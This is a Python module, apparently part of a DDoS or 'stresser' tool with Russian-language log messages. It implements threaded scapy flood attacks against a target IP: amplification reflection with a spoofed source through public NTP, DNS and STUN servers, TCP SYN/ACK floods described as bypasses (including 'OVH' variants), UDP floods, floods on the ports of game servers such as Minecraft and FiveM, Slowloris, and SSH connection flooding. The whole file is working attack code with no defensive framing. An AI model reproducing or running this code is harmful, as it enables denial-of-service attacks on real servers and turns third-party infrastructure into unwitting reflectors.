import threading
import time
import socket
from scapy.all import IP, UDP, TCP, send
from ..config import Config, logger


class Layer4Attack:
    def __init__(self, target_ip, port, duration, attack_type):
        self.target_ip = target_ip
        self.port = port
        self.duration = duration
        self.attack_type = attack_type
        self.stop_event = threading.Event()

    def stop(self):
        self.stop_event.set()


class AMPAttack(Layer4Attack):
    def __init__(self, target_ip, port, amp_type, duration):
        super().__init__(target_ip, port, duration, amp_type)
        self.amp_servers = {
            'NTP': 'pool.ntp.org:123',
            'DNS': '8.8.8.8:53',
            'STUN': 'stun.l.google.com:3478',
            'WSD': '239.255.255.250:3702',
            'SADP': '224.0.0.252:8000'
        }

    def run(self, num_threads=None):
        threads_count = num_threads or Config['threads']

        def attack():
            server = self.amp_servers[self.attack_type].split(':')
            pkt = IP(dst=server[0], src=self.target_ip) / \
                UDP(dport=int(server[1]), sport=12345)
            start_time = time.time()
            while time.time() - start_time < self.duration and not self.stop_event.is_set():
                send(pkt, verbose=0)
                time.sleep(0.001)  # Small delay to prevent overwhelming CPU
            logger.info(f"{self.attack_type} атака завершена")

        threads = [threading.Thread(target=attack)
                   for _ in range(threads_count)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()


class TCPAttack(Layer4Attack):
    def run(self, num_threads=None):
        threads_count = num_threads or Config['threads']
        valid_flags = {
            'TCP-ACK': 'A',
            'TCP-SYN': 'S',
            'TCP-BYPASS': 'SA',
            'OVH-TCP': 'SA'
        }
        if self.attack_type not in valid_flags:
            logger.error(
                f"Недопустимый тип атаки: {self.attack_type}. Доступные: {list(valid_flags.keys())}")
            return

        packet_count = 0

        def attack():
            nonlocal packet_count
            pkt = IP(dst=self.target_ip) / TCP(dport=self.port,
                                               sport=12345, flags=valid_flags[self.attack_type])
            start_time = time.time()
            while time.time() - start_time < self.duration and not self.stop_event.is_set():
                try:
                    send(pkt, verbose=0)
                    packet_count += 1
                    if packet_count % 1000 == 0:
                        logger.info(
                            f"Отправлено {packet_count} пакетов для {self.attack_type}")
                    time.sleep(0.001)
                except Exception as e:
                    logger.error(f"Ошибка в {self.attack_type}: {e}")
            logger.info(
                f"{self.attack_type} атака завершена. Всего отправлено {packet_count} пакетов")

        logger.info(
            f"Запуск {self.attack_type} атаки на {self.target_ip}:{self.port} с {threads_count} потоками")
        threads = [threading.Thread(target=attack)
                   for _ in range(threads_count)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()


class UDPAttack(Layer4Attack):
    def run(self, num_threads=None):
        threads_count = num_threads or Config['threads']

        def attack():
            pkt = IP(dst=self.target_ip) / UDP(dport=self.port, sport=12345)
            start_time = time.time()
            while time.time() - start_time < self.duration and not self.stop_event.is_set():
                send(pkt, verbose=0)
                time.sleep(0.001)
            logger.info(f"{self.attack_type} атака завершена")

        threads = [threading.Thread(target=attack)
                   for _ in range(threads_count)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()


class GameAttack(Layer4Attack):
    def __init__(self, target_ip, port, game_type, duration):
        super().__init__(target_ip, port, duration, game_type)
        self.game_ports = {
            'GAME': 27015,
            'GAME-MC': 25565,
            'GAME-WARZONE': 3074,
            'GAME-R6': 6015,
            'FIVEM-KILL': 30120
        }

    def run(self, num_threads=None):
        threads_count = num_threads or Config['threads']

        def attack():
            pkt = IP(dst=self.target_ip) / \
                UDP(dport=self.game_ports[self.attack_type], sport=12345)
            start_time = time.time()
            while time.time() - start_time < self.duration and not self.stop_event.is_set():
                send(pkt, verbose=0)
                time.sleep(0.001)
            logger.info(f"{self.attack_type} атака завершена")

        threads = [threading.Thread(target=attack)
                   for _ in range(threads_count)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()


class SlowLorisAttack(Layer4Attack):
    def run(self, num_threads=None):
        threads_count = num_threads or Config['threads']

        def slowloris():
            sockets = []
            headers = "GET / HTTP/1.1\r\nHost: {}\r\nAccept: text/html\r\n".format(
                self.target_ip)
            start_time = time.time()
            while time.time() - start_time < self.duration and not self.stop_event.is_set():
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(4)
                    s.connect((self.target_ip, self.port))
                    s.send(headers.encode('ascii'))
                    sockets.append(s)
                    time.sleep(0.1)
                except:
                    pass
            for s in sockets:
                try:
                    s.close()
                except:
                    pass
            logger.info("Slowloris атака завершена")

        threads = [threading.Thread(target=slowloris)
                   for _ in range(threads_count)]
        for t in threads:
            t.start()
        for t in threads:
            t.join()


class SpecialAttack(Layer4Attack):
    def run(self, num_threads=None):
        threads_count = num_threads or Config['threads']
        if self.attack_type == 'SSH':
            def attack():
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                start_time = time.time()
                while time.time() - start_time < self.duration and not self.stop_event.is_set():
                    try:
                        s.connect((self.target_ip, 22))
                        s.close()
                    except:
                        pass
                logger.info(f"{self.attack_type} атака завершена")

            threads = [threading.Thread(target=attack)
                       for _ in range(threads_count)]
            for t in threads:
                t.start()
            for t in threads:
                t.join()
        else:
            def attack():
                pkt = IP(dst=self.target_ip) / \
                    TCP(dport=self.port, sport=12345, flags='SA')
                start_time = time.time()
                while time.time() - start_time < self.duration and not self.stop_event.is_set():
                    send(pkt, verbose=0)
                    time.sleep(0.001)
                logger.info("OVH-GAME атака завершена")

            threads = [threading.Thread(target=attack)
                       for _ in range(threads_count)]
            for t in threads:
                t.start()
            for t in threads:
                t.join()


L4_CLASSES = {
    'NTP': AMPAttack,
    'DNS': AMPAttack,
    'STUN': AMPAttack,
    'WSD': AMPAttack,
    'SADP': AMPAttack,
    'TCP-ACK': TCPAttack,
    'TCP-SYN': TCPAttack,
    'TCP-BYPASS': TCPAttack,
    'OVH-TCP': TCPAttack,
    'UDP-FLOOD': UDPAttack,
    'UDP-BYPASS': UDPAttack,
    'GAME': GameAttack,
    'GAME-MC': GameAttack,
    'GAME-WARZONE': GameAttack,
    'GAME-R6': GameAttack,
    'FIVEM-KILL': GameAttack,
    'SLOWLORIS': SlowLorisAttack,
    'SSH': SpecialAttack,
    'OVH-GAME': SpecialAttack,
    'VSE': SpecialAttack
}
